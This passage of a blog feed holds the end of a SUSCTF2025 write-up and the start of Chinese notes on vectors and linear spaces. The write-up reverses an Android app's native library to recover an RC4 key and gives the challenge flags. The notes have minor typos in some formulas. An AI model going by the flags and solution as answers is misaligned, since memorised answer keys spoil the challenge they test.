src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251007003401749.png" alt="image-20251007003401749"></p><h3 id="simple_message-flag"><a href="#simple-message-flag" class="headerlink" title="simple_message-flag"></a>simple_message-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8bded2c3ed85&#125;</span><br></pre></td></tr></table></figure><h1 id="re"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="android-native"><a href="#android-native" class="headerlink" title="android-native"></a>android-native</h2><h3 id="android-native-分析"><a href="#android-native-分析" class="headerlink" title="android-native-分析"></a>android-native-分析</h3><ul><li>附件是一个<code>apk</code>文件，并且题目是<code>android-native</code>，应该主要考察的就是<code>native</code>层的逆向。还是按照步骤一步一步来，先将apk安装到雷电模拟器后再打开。发现就是这么一个简单的界面。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225103355.png" alt="image-20251006225103355"></p><ul><li>然后再使用<code>jadx</code>进行<code>java</code>层的逆向，看看<code>java</code>层有没一些细节的东西。然而并没有，<code>flag</code>的判断逻辑全部都在<code>native</code>层。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225154434.png" alt="image-20251006225154434"></p><ul><li>那就直接进行<code>native</code>层的逆向分析，将<code>apk</code>文件解压缩，翻到<code>lib</code>文件夹，发现竟然有<code>x86_64</code>的<code>so</code>文件，那就直接逆向<code>x86_64</code>的<code>so</code>文件。还是<code>x86_64</code>的汇编看得舒服。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225323935.png" alt="image-20251006225323935"></p><ul><li>使用<code>IDA pro</code>反编译后发现加密逻辑主要就在这两个函数中。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225504844.png" alt="image-20251006225504844"></p><ul><li>对于<code>sub_950</code>来说，是一个异或赋值操作。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225535932.png" alt="image-20251006225535932"></p><ul><li>而在<code>sub_A60</code>这边会发现密文，并且密钥其实就是上面异或后的东西。并且根据特征与积累，再加上<code>AI</code>分析一下基本上就能判断出<code>sub_A60</code>就是一个<code>RC4</code>加密算法。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225752755.png" alt="image-20251006225752755"></p><ul><li>先求出异或后的密钥：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&quot;1m1r6rqro1l~dr&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">0</span>])),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">1</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">2</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">3</span>])^<span class="number">4</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">4</span>])^<span class="number">5</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">5</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">6</span>])^<span class="number">4</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">7</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">8</span>])^<span class="number">9</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">9</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">10</span>])^<span class="number">9</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">11</span>])^<span class="number">8</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">12</span>])^<span class="number">1</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(c[<span class="number">13</span>])),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># 1l0v3susf0ever</span></span><br></pre></td></tr></table></figure><ul><li>然后直接在线<code>rc4</code>解密即可。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225929338.png" alt="image-20251006225929338"></p><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006225948930.png" alt="image-20251006225948930"></p><h3 id="android-native-flag"><a href="#android-native-flag" class="headerlink" title="android-native-flag"></a>android-native-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;de094624-8f5b-44dc-<span class="number">8</span>10c-58132a2b5ea3&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：国际赛打不动越打越自闭，打打国内的顺便复建一下pwn。</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-向量与线性空间</title>
    <link href="http://iyheart.github.io/2025/10/03/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%A9%BA%E9%97%B4/"/>
    <id>http://iyheart.github.io/2025/10/03/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F%E4%B8%8E%E7%BA%BF%E6%80%A7%E7%A9%BA%E9%97%B4/</id>
    <published>2025-10-03T08:29:51.000Z</published>
    <updated>2025-11-26T17:27:16.372Z</updated>
    
    <content type="html"><![CDATA[<ul><li>对于前面的矩阵和行列式的研究，已经研究出了线性方程组如果有唯一解，那么就有$det(\mathbf{A})≠0$。但是这个研究结果并不令人满意。存在一下两点：<ul><li>当$det(\mathbf{A})=0$，那么线性方程组就有两种情况，无解或者有无穷多个解，但是无法分辨出来具体是哪种情况。</li><li>在多数情况下方程组的未知数个数与方程的个数是不一样的，这种情况无法使用行列式判断。</li></ul></li><li>上面这两个问题就使得还需要研究与完善这个规律，就需要从单个方程出发，这里就引入了用一个向量表示一个方程，所以除了高中学的向量的普遍意义之外，向量还用来表示方程的系数。比如下面的线性方程组中$x_1$的系数就可以用一个列向量表示：</li></ul><script type="math/tex; mode=display">\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n &= b_1 \\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n &= b_2\\~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&~~~~~~\vdots\\a_{s1}x_1+a_{s2}x_2+...+a_{sn}x_n&=b_s\end{cases}\Rightarrow\vec{a}=\begin{pmatrix}a_{11} \\a_{21} \\...    \\a_{s1}\end{pmatrix}</script><h1 id="向量与线性空间"><a href="#向量与线性空间" class="headerlink" title="向量与线性空间"></a>向量与线性空间</h1><blockquote><p><strong>规定向量的运算</strong>：</p><p>取定数域$K$，设n是任意给定的正整数。令$K^{n}={(a_1,a_2,…,a_n)|a_i\in K,i,1,2,…,n}$。</p><ol><li><p>如果$a_1=b_1,a_2=b_2,…,a_n=b_n$，则称$K^{n}$中的两个元素：$(a_1,a_2,…,a_n)$与$(b_1,b_2,…,b_n)$相等</p></li><li><p>在$K^{n}$中加法的运算，$(a_1,a_2,…,a_n)+(b_1,b_2,…,b_n)\stackrel{\mathrm{def}}{=} (a_1+b_1,a_2+b_2,…,a_n+b_n)$</p></li><li>在$K^{n}$中数乘运算，$k(a_1,a_2,…,a_n)\stackrel{\mathrm{def}}{=}(ka_1,ka_2,…,ka_3)$</li></ol><p>由以上三种运算的定义或者由初等行变换可以推导出下面8条运算性质，其中加法有四条，数乘也有四条：</p><ol><li>$\mathbf{\alpha}+\mathbf{\beta}=\mathbf{\beta}+\mathbf{\alpha}$</li><li>$(\mathbf{\alpha}+\mathbf{\beta})+\mathbf{\gamma}=\mathbf{\alpha}+(\mathbf{\beta}+\mathbf{\gamma})$</li><li>把元素<code>(0,0,...,0)</code>记作$\mathbf{0}$称为零向量，它使得：$\mathbf{0}+\mathbf{\alpha}=\mathbf{\alpha}+\mathbf{0}=\mathbf{\alpha}$</li><li>对于$\mathbf{\alpha}=(a_1,a_2,…,a_n)\in K^{n}$令，$-\mathbf{\alpha}\stackrel{\mathrm{def}}=(-a_1,-a_2,…,a_n)\in K^{n}$，则有$\mathbf{\alpha}+(-\mathbf{\alpha})=(-\mathbf{\alpha)}+\mathbf{\alpha}=\mathbf{0}$，称$-\mathbf{\alpha}$是$\alpha$的负元</li><li>$1\mathbf{\alpha}=\mathbf{\alpha}$</li><li>$(kl)\mathbf{\alpha}=k(l\mathbf{\alpha})$</li><li>$(k+l)\mathbf{\alpha}=k\mathbf{\alpha}+l\mathbf{\alpha}$</li><li>$k(\mathbf{\alpha+\beta})=k\mathbf{\alpha}+k\mathbf{\beta}$</li></ol><p>满足这8条运算性质的还有如下：</p><ol><li>平面上以定点O为起点的所有向量组成的集合</li><li>直线上以定点O为起点的所有向量组成的集合</li><li>空间中以定点O为起点的所有向量组成的集合</li></ol><p>数学最基本的两个概念集合和映射。</p><p><strong>集合</strong>：</p><p><strong>映射</strong>：若一个对应法则$f:A\rightarrow B$，有A中的每个元素A，都对应着B中的唯一的一个元素b，则称$f$是A到B的一个映射。</p><p>b被称为a在$f$映射下的像；a被称为b在$f$映射下的<strong>一个原像</strong></p><p>A被称为定义域<code>domain</code>，B被称为陪域<code>codomain</code></p><p>$f$的值域(或者被称为像，像集)，$f(A):={f(a)|a\in A}$，也记作<code>Imf</code></p><p>若$f(A)=B$，则$f$称为一个<strong>满射</strong>,若A中不同元素在$f$上的像不同，则称$f$是单射。</p><p>如果$f$即是单射，又是满射，f称为一个双射（或一一对应）</p><p><strong>运算</strong>：</p><p>$2+3=5$，其实就是有序整数对$(2,3)\rightarrow 5$</p><p>$2*3=6$，其实就是有序整数对$(2,3)\rightarrow 6$</p><p>$S×M:={(a,b)|a\in S,b\in M}$，称为S与M的笛卡尔积。</p><p><strong>运算的定义</strong>：非空集合$S$上的一个<strong>代数运算</strong>，是指$S×S$到$S$的一个映射。</p><p><strong>定义1</strong>：向量、向量空间的定义。</p><p>数域K上所有<code>n</code>元有序数组组成的集合$K^{n}$，连同定义在它上面的加法运算和数量数乘运算，及其满足的8条运算法则一起，称为数域K上的一个<strong>n维向量空间</strong>。$K^{n}$的元素称为<strong>n维向量</strong>，设向量$\alpha=(a_1,a_2,…,a_n)$，称$a_i$是$\alpha$的第<code>i</code>个<strong>分量</strong>。通常用小写的希腊字母$\alpha、\beta、\gamma、…$表示向量。</p><p><strong>定义2</strong>：<strong>线性空间</strong>，将满足上面8条运算的事物抽象出来，建立了线性空间的模型。</p><p>设$V$是一个非空集合，$K$是一个数域，如果$V$上有一个运算，称为加法，即$(\alpha,\beta)\rightarrow\alpha+\beta$；</p><p>$K$与$V$之间的运算，称为<strong>数乘</strong>，即$K×V\rightarrow V:(k,\alpha)\rightarrow k\alpha$</p><p>满足下述8条运算集合，则称为<strong>V</strong>是数域<strong>K</strong>上的一个线性空间</p><ol><li>$\alpha+\beta=\beta+\alpha,\forall \alpha,\beta\in V$，加法交换律</li><li>$(\alpha+\beta)+\gamma=\alpha+(\beta+\gamma),\forall \alpha,\beta,\gamma\in V$，加法结合律</li><li>$V$中有一个元素，记作$\mathbf{0}$，则有下面性质，则把$\mathbf{0}$称为V的零元。$\alpha + 0=\alpha,\forall \alpha \in V$</li><li>对于$\alpha \in V$，有$\beta \in V$，使得$\alpha + \beta = 0$，把$\beta$称为$\alpha$的<strong>负元</strong></li><li>$1\alpha=\alpha,\forall \alpha \in V$</li><li>$(kl)\alpha = k(l\alpha),\forall k,l \in K,\alpha\in V$</li><li>$(k+l)\alpha=k<em>\alpha+l</em>\alpha,\forall k,l\in K,\alpha \in V$</li><li>$k(\alpha+\beta)=k\alpha+k\beta,\forall k\in K,\alpha,\beta \in V$</li></ol><p>所以向量$K^{n}:={(a_1,a_2,…,a_n)|a_i\in K,i=1,2,…,n}$被称为数域<strong>K</strong>上的线性空间，通常称为数域$K$上的n维向量空间。</p><p>实际上<strong>借用几何语言</strong>，线性空间的元素称为一个<strong>向量</strong>，线性空间也可以称为<strong>向量空间</strong></p></blockquote><h1 id="线性空间的性质"><a href="#线性空间的性质" class="headerlink" title="线性空间的性质"></a>线性空间的性质</h1><blockquote><p>点动成线、线动成面、面动成体，所以集合空间中的基本元素是点。但是点与点之间有什么运算呢？所以高中引入了向量，以及向量的坐标。任意选定一个固定点$O$，就可以使用以$O$为起点的向量一一对应，$O$点本身就是零向量。这样其实就给出了几何空间的定义。</p><p><strong>例子1</strong>：几何空间的定义</p><p>以定点$O$为起点的所有向量，构成了几何空间，满足8条运算所以是一个线性空间。</p><p><strong>例子2</strong>：</p><p>$K^{n}:={(a_1,a_2,…,a_n)|a\in K,i=1,2,…,n}$，n维向量也满足8条运算性质</p><p><strong>例子3</strong>：</p><p>非空集合$X$到$\R$的映射，称为函数，集合$X$不要求一定是数。称为$X$上的一个实值函数。记为$\R^{X}:={非空集合X到\R的映射}$</p><p><strong>线性空间的性质</strong>：</p><p>通过这样的例子，抽象出共同点，得到线性空间。现在假定$V$是数域K上的线性空间，则归纳出以下线性空间的性质：</p><ol><li>$V$的零元唯一。</li><li><p>每个$\alpha \in V$的负元唯一，将$\alpha$的负元记作$-\alpha$</p></li><li><p>$0\alpha=\mathbf{0}$</p></li><li><p>$k\mathbf{0}=\mathbf{0}$</p></li><li>若$k\alpha=0$，则$k=0$或$\alpha=\mathbf{0}$</li><li>$(-1)\alpha=-\alpha,\forall \alpha \in V$</li><li>$\alpha-\beta=\alpha+(-\beta)$</li></ol></blockquote><h1 id="线性子空间"><a href="#线性子空间" class="headerlink" title="线性子空间"></a>线性子空间</h1><blockquote><p><strong>定义1</strong>：线性子空间</p><p>设$V$是数域$K$上的线性空间，$U$是$V$的一个非空子集，如果$U$对$V$的加法和数量乘法，也成为数域$K$上的一个线性空间，则称$U$是$V$的一个(线性)子空间。</p><p><strong>定义2</strong>：</p><p>对于定理1中的eg2来说，$W$对于$V$的加法，数量乘法封闭，因此$W$是$V$的子空间，像这样的子空间，称它是<strong>由向量组$\alpha_1,….,\alpha_s$生成的子空间</strong>记作$&lt;\alpha_1,…,\alpha_s&gt;$或$L(\alpha_1,…,\alpha_s)$</p><p><strong>定义3</strong>：线性表出<br>$\beta\in&lt;\alpha_1,…,\alpha_s&gt;\Longleftrightarrow$存在$K$中的一组数$l_1,…,l_s$使得$\beta=l_1\alpha_1+…+l_s\alpha_s$，此时称$\beta$可以由向量$\alpha_1,…,\alpha_s$<strong>线性表出</strong></p><p><strong>定理1：线性子空间的充要条件</strong>：</p><p>$V$的非空子集$U$是子空间：</p><ol><li>若$\alpha,\beta \in U$，则$\alpha+\beta \in U$（U对于V的加法封闭）</li><li>若$\alpha \in U,k\in K$，则$k\alpha \in U$（U对于V的数乘封闭）</li></ol><p>eg1：${0}$是V的子空间</p><p>eg2：向量组$W={k_1\alpha_1+…+k_s\alpha_s|k_1,..,k_s\in K}$称为向量组$\alpha_1,…,\alpha_k$的一个线性组合,也是一个V的子空间。</p></blockquote><h1 id="线性相关与线性无关"><a href="#线性相关与线性无关" class="headerlink" title="线性相关与线性无关"></a>线性相关与线性无关</h1><p>通过介绍一些有关于向量的概念，现在就要回到用向量研究线性方程组的解的问题上。现在先来解决用向量如何表示线性方程组的常数和系数。</p><ul><li>如下图所示的个向量的线性方程组，我们可以使用一个列向量来表示方程组中每个方程中相同未知数的系数。</li></ul><script type="math/tex; mode=display">\begin{cases}a_{11}x_1+a_{12}x_2+...+a_{1n}x_n &= b_1 \\a_{21}x_1+a_{22}x_2+...+a_{2n}x_n &= b_2\\~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&~~~~~~\vdots\\a_{s1}x_1+a_{s2}x_2+...+a_{sn}x_n&=b_s\end{cases}</script><ul><li><p>对于那么对于上面这个方程组，分别使用列向量$\alpha_1,…,\alpha_n$表示相同未知数前面的系数的集合，使用$\beta$表示常数，那么方程组就可以使用向量更简单的表示出来：</p><script type="math/tex; mode=display">\alpha_1=\begin{pmatrix}a_{11} \\a_{21} \\...    \\a_{s1}\end{pmatrix},....,\alpha_n=\begin{pmatrix}a_{1n} \\a_{2n} \\...    \\a_{sn}\end{pmatrix},\beta=\begin{pmatrix}b_{1} \\b_{2} \\...    \\b_{s}\end{pmatrix}\\\\x_1\alpha_1+.....+x_n\alpha_n=\beta</script><ul><li>那么方程组$x_1\alpha_1+…..+x_n\alpha_n=\beta$有解</li><li>$\Longleftrightarrow$有$K$中的一组数$c_1,…,c_n$，使得$c_1\alpha_1+…+c_n\alpha_n=\beta$</li><li>$\Longleftrightarrow\beta$可以由列向量组$\alpha_1,…,\alpha_n$<strong>线性表出</strong></li><li>$\Longleftrightarrow\beta\in&lt;\alpha_1,…,\alpha_n&gt;$</li><li>所以本章任务：<strong>研究线性空间和它的子空间的结构</strong></li></ul></li></ul><blockquote><p><strong>定义1</strong>：线性相关与线性无关</p><p>设$V$是数域$K$上的一个线性空间，$V$中的一个向量$\alpha_1,…,\alpha_s(s≥1)$：</p><p>如果有$K$中不全为0的数$k_1,….,k_s$使得$k_1\alpha_1+…+k_s\alpha_s=\vec{0}$，那么就称向量组$\alpha_1,…,\alpha_s$<strong>线性相关</strong>。</p><p>如果从$k_1\alpha_1+…+k_s\alpha_s=\vec{0}$可以推出$k_1=…=k_s=0$，那么向量组$\alpha_1,…,\alpha_s(s≥1)$称为<strong>线性无关</strong></p><p><strong>定理1</strong>：线性相关与无关和线性方程组的解</p><p>$K^s$中，列向量组$\alpha_1,…,\alpha_n$线性相关</p><p>$\Longleftrightarrow$有$K$个不全为0的数$c_1,…,c_n$使得$c_1\alpha_1+…+c_n\alpha_n=\vec{0}$</p><p>$\Longleftrightarrow$K上n元齐次线性方程组$x_1\alpha_1+…+x_n\alpha_n=\vec{0}$有非零解</p><p>从而$K^s$中，列向量组$\alpha_1,…,\alpha_n$线性无关</p><p>$\Longleftrightarrow$齐次线性方程组$x_1\alpha_1+…+x_n\alpha_n=\vec{0}$只有零解 </p><p>从而得出结论：$K^n$中，列向量组$\alpha_1,…,\alpha_n$线性相关(线性无关)$\Longleftrightarrow$以$\alpha_1,…,\alpha_n$为列向量组的矩阵$A$行列式等于0(不等于0)。行向量组一样。</p><p>注意：$K^n$是数域K上的n维向量，而$\alpha_1,…,\alpha_n$这个向量组的向量个数是<code>n</code>，所以会矩阵A是<code>n×n</code>的数表。</p></blockquote><h1 id="线性相关与线性无关的性质"><a href="#线性相关与线性无关的性质" class="headerlink" title="线性相关与线性无关的性质"></a>线性相关与线性无关的性质</h1><blockquote><p>设$V$是数域$K$上的一个线性空间</p><p><strong>性质1</strong>：</p><p>$\alpha$线性相关$\Longleftrightarrow$有$k≠0$，使得$k\alpha=\vec{0}$$\Longleftrightarrow \alpha=\vec{0}$</p><p>$\alpha$线性无关$\Longleftrightarrow \alpha≠0$</p><p><strong>性质2</strong>：</p><p>向量组$\alpha_1,…,\alpha_s$如果有一个部分组（一部分向量组成的向量组）线性相关，那么$\alpha_1,…,\alpha_s$线性相关。</p><p>从而向量组$\alpha_1,…,\alpha_s$如果线性无关，那么$\alpha_1,…,\alpha_s$的任何一个部分组都线性无关。</p><p><strong>性质3</strong>：</p><p>含有$\vec{0}$的任何一个向量组都线性相关</p><p><strong>性质4</strong>：</p><p>向量组$\alpha_1,…,\alpha_s$线性相关$\Longleftrightarrow$其中至少有一个向量可以由其余向量线性表出。</p><p>从而向量组$\alpha_1,…,\alpha_s$线性无关<script type="math/tex">\Longleftrightarrow</script>其中每一个向量都不能由其余向量线性表出</p><p><strong>命题1</strong>：线性无关的向量组特殊性质一</p><p>设$\beta$可以由向量组$\alpha_1,…,\alpha_s$线性表出，则表出方式唯一。$\Longleftrightarrow$$\alpha_1,…,\alpha_s$线性无关。</p><p><strong>命题2</strong>：线性无关的向量组特殊性质二</p><p>设$\alpha_1,…,\alpha_s$线性无关，如果$\alpha_1,…,\alpha_s,\beta$线性相关，那么$\beta$可以由$\alpha_1,….,\alpha_s$线性表出</p><p><strong>归纳总结</strong>：从各种角度上看线性相关和线性无关</p><p><strong>角度1</strong>：从线性组合看</p><p>向量组$\alpha_1,….,\alpha_s(s≥1)$<strong>线性相关</strong>$\Longleftrightarrow$它们有系数不全为0的线性组合等于零向量</p><p>向量组$\alpha_1,….,\alpha_s(s≥1)$<strong>线性无关</strong>$\Longleftrightarrow$它们只有系数全为0的线性组合才会等于零向量</p><p><strong>角度2</strong>：从线性表出看</p><p>向量组$\alpha_1,….,\alpha_s(s≥2)$<strong>线性相关</strong>$\Longleftrightarrow$其中至少有一个向量可以由其余向量线性表出</p><p>向量组$\alpha_1,….,\alpha_s(s≥2)$<strong>线性无关</strong>$\Longleftrightarrow$其中每一个向量都不能由其余向量线性表出。</p><p><strong>角度3</strong>：从齐次线性方程组看：</p><p>列向量组$\alpha_1,….,\alpha_s(s≥1)$<strong>线性相关</strong>$\Longleftrightarrow$齐次线性方程组$x_1\alpha_1+…+x_s\alpha_s=0$有非零解。</p><p>列向量组$\alpha_1,….,\alpha_s(s≥1)$<strong>线性无关</strong>$\Longleftrightarrow$齐次线性方程组$x_1\alpha_1+…+x_s\alpha_s=0$只有零解。</p><p><strong>角度4</strong>：从行列式看：</p><p>n个n维列（行）向量组$\alpha_1,….,\alpha_n$<strong>线性相关</strong>$\Longleftrightarrow$以$\alpha_1,\alpha_2,….,\alpha_n$为列（行）向量组的矩阵的行列式<strong>等于零</strong>。</p><p>n个n维列（行）向量组$\alpha_1,….,\alpha_s(s≥1)$<strong>线性无关</strong>$\Longleftrightarrow$以$\alpha_1,\alpha_2,…,\alpha_n$为列（行）向量组的句子的行列式<strong>不等于零</strong>。</p><p><strong>角度5</strong>：从向量组线性表出一个向量的方式看</p><p>设向量$\beta$可以由向量组$\alpha_1,\alpha_2,…,\alpha_s$线性表出，则向量组$\alpha_1,…,\alpha_s$线性无关$\Longleftrightarrow$表出方式唯一</p><p>向量组$\alpha_1,…,\alpha_s$线性相关$\Longleftrightarrow$表出方式有无穷多种</p><p><strong>角度6</strong>：从向量组与它的部分组的关系看</p><p>如果向量组的一个部分组线性相关，那么整个向量组也线性相关。</p><p>如果向量组线性无关，那么它的任何一个部分组都线性无关。</p><p><strong>角度7</strong>：</p><p>从向量组与它的延伸组或缩短组的关系看：</p><p>如果向量组线性无关，那么把每个向量添加上m个分量（所添加的位置对于每个向量都一样）得到的延伸组也线性无关。</p><p>如果向量组线性相关，那么把每个向量去掉m个分量（去掉的分量的位置对于每个向量都一样）得到的缩短组也线性相关。</p></blockquote><h1 id="极大线性无关组与向量的秩"><a href="#极大线性无关组与向量的秩" class="headerlink" title="极大线性无关组与向量的秩"></a>极大线性无关组与向量的秩</h1><blockquote><p><strong>定义1</strong>：极大线性无关组</p><p>向量组$\alpha_1,…,\alpha_s$的一个部分组（包括全部）如果满足如下条件，那么称为这个部分组是向量组的一个极大线性无关组：</p><ol><li>这个部分组线性无关</li><li>从向量组的其余向量（如果有的话）中任取一个添进来，得到新的部分组都线性相关。</li></ol><p><strong>定义2</strong>：</p><p>如果向量组$\alpha_1,…,\alpha_s$的每一个向量都可以由向量组$\beta_1,…,\beta_r$线性表出，那么称向量组$\alpha_1,…,\alpha_s$可以由向量组$\beta_1,…,\beta_r$线性表出。如果向量组$\alpha_1,…,\alpha_s$与向量组$\beta_1,…,\beta_r$可以<strong>互相线性表出</strong>，那么称向量组$\alpha_1,…,\alpha_s$与$\beta_1,…,\beta_r$<strong>等价</strong>，记作${\alpha_1,…,\alpha_s}\cong{\beta_1,…,\beta_r}$</p><p><strong>性质1</strong>：向量组等价的性质</p><ol><li>反身性，即任何一个向量组都与自身等价</li><li>对称性，即如果$\alpha_1,…,\alpha_s$与$\beta_1,…,\beta_r$等价，那么$\beta_1,…,\beta_r$与$\alpha_1,…,\alpha_s$等价。</li><li>传递性，即如果：${\alpha_1,…,\alpha_k}\cong{\beta_1,…,\beta_r}$，${\beta_1,…,\beta_r}\cong {\gamma_1,…,\gamma_t}$，那么就有${\alpha_1,…,\alpha_k}\cong{\gamma_1,…,\gamma_t}$</li></ol><p><strong>命题1</strong>：</p><p>向量组与它的任意一个极大线性无关组等价</p><p><strong>推论1</strong>：</p><p>向量组的任意两个极大线性无关组等价</p><p><strong>推论2</strong>：</p><p>$\beta$可以由向量组$\alpha_1,…,\alpha_s$线性表出当且仅当$\beta$可以由$\alpha_1,…,\alpha_s$的一个极大线性无关组线性表出。</p><p><strong>引理1</strong>：</p><p>设向量组$\beta_1,\beta_2,…,\beta_r$可以由向量组$\alpha_1,\alpha_2,…,\alpha_s$线性表出，如果$r&gt;s$，那么$\beta_1,\beta_2,…,\beta_r$线性相关。</p><p><strong>推论3</strong>：</p><p>设向量组$\beta_1,\beta_2,…,\beta_r$，可以由向量组$\alpha_1,\alpha_2,…,\alpha_s$线性表出，如果$\beta_1,\beta_2,…,\beta_r$线性无关，那么$r≤s$。</p><p><strong>推论4</strong>：</p><p>向量组的任意两个极大线性无关组所含向量的个数相等。</p><p><strong>定义3</strong>：<strong>重中之重</strong></p><p>向量组的极大线性无关组所含向量的个数称为这个<strong>向量组的秩(rank)</strong></p><p><strong>命题2</strong>：</p><p>向量组$\alpha_1,\alpha_2,…,\alpha_s$线性无关的充分必要条件是它的秩等于它所含向量的个数。</p><p><strong>命题3</strong>：</p><p>如果向量组$(I)$可以由向量组$(II)$线性表出，那么$(I)$的秩$≤(II)$的秩。</p><p><strong>命题4</strong>：</p><p>等价的向量组有相等的秩。</p><p><strong>注意</strong>：秩相等的两个向量组不一定等价。</p></blockquote><h1 id="基-维数与坐标"><a href="#基、维数与坐标" class="headerlink" title="基、维数与坐标"></a>基、维数与坐标</h1><ul><li>注意这块内容对应的是下册第八章线性空间的第一节，数域上线性空间的基与维数。这个是因为一个学期要上完一个学年的内容，所以丘老直接不讲具体的$K^n$上的基与维数，直接将抽象的向量空间的基与维数，还讲了坐标。</li><li>其实先学高代或者数论的其中一门课再去学抽代都会更轻松，因为高代中的线性空间其实也是一种代数结构，而学习抽代其实很多例子会用到数论的例子。</li></ul><blockquote><p><strong>定义1</strong>：子集的线性相关和线性无关的定义</p><ol><li>$V$的一个有限子集${\alpha_1,…,\alpha_s}$线性相关（线性无关）$\Longleftrightarrow$向量组$\alpha_1,…,\alpha_s$线性相关（线性无关）。</li><li>$V$的一个无限子集$S$线性相关$\Longleftrightarrow$$S$有一个有限子集是线性相关</li><li>$V$的无限子集$S$线性无关$\Longleftrightarrow$$S$的任何一个有限子集都线性无关</li><li>空集$\phi$定义成线性无关</li></ol><p><strong>定义2</strong>：</p><p>设$V$是数域$K$上的线性空间，$V$的一个子集$S$如果满足下面两个条件，那么称$S$是$V$的一个基：</p><ol><li>$S$是线性无关的</li><li>$V$中任一向量可以由$S$的有限多个向量线性表出</li></ol><p>注解1：在该定义中若$S={\alpha_1,…,\alpha_s}$，则向量组$\alpha_1,…,\alpha_s$是$V$的一个（有序）基</p><p>注解2：任何一个数域$K$上的任意线性空间都有一个基。（具体证明在下册教材第157页到158页）</p><p><st